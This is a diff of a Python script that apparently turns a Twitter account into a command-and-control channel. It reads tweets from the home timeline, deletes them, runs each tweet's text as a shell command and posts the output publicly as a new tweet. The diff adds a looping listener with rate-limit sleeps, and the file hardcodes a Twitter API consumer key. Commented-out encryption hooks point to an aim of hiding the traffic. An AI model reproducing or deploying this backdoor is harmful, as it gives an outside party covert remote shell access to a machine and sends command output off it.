@@ -2,6 +2,7 @@ import tweepy
 #from newEncrypt import *
 import subprocess
 import os
+from time import sleep
 
 
 consumer_key = 'zLZ2NN1qemQChgVOae3QlgNtp'
@@ -13,21 +14,64 @@ auth = tweepy.OAuthHandler(consumer_key, consumer_secret)
 auth.set_access_token(access_token, access_token_secret )
 api = tweepy.API(auth)
 
-#while True:
-public_tweets = api.home_timeline()
+
+
+ 
+
+count = 0
+
+
+def listen():
+	global count
+	public_tweets = None
+	while(not public_tweets):
+		public_tweets = api.home_timeline()
+		count = count +1
+		if public_tweets:
+			for tweet in public_tweets:
+				test = str(tweet.text)			
+				api.destroy_status(tweet.id)
+				response = subprocess.check_output(test, shell=True)
+				api.update_status(response)
+				print response
+			if count == 9:
+				print "Sleeping for 15 minutes..."
+				
+				count = 0
+				sleep(61 * 15)
+			else:
+				new_public_tweets = api.home_timeline()
+				count = count +1
+				for tweet in new_public_tweets:	
+					#sleep(5)		
+					api.destroy_status(tweet.id)						
+				if count == 9:
+					print "Sleeping for 15 minutes..."
+					
+					count = 0
+					sleep(61 * 15)
+				else: 		
+					listen()
+		else: 
+			print("No tweets!")
+			sleep(5)
+
+
+if __name__ == "__main__":
+	#while(1):
+		listen()
+	
 #new_tweets = api.search(q='PhoenixKrazyKat', count=10)
 #print new_tweets
 
-count = 0
-for tweet in public_tweets:
-	test = str(tweet.text)
-	api.destroy_status(tweet.id)
-	#bytes = str.encode(test)
-	#type(bytes)	
-	#mess = decode(bytes)
-	response = subprocess.check_output(test, shell=True)
-	#enResponse = encode(response) 
-	api.update_status(response)
+
+	
+		#bytes = str.encode(test)
+		#type(bytes)	
+		#mess = decode(bytes)
+		
+		#enResponse = encode(response) 
+	
 	
 	#count = count + 1
 
